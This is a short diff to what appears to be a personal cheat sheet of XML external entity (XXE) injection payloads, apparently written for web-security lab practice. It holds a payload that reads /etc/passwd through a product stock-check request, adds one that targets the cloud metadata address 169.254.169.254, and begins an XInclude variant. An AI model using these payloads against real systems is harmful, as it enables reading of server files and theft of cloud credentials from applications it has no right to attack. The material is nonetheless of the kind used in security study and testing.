@@ -1,6 +1,8 @@
 xxe: <productID>6</productId>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+
 Bxxe:  (normal paramter eg: productId=122&storeid=1)
 
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
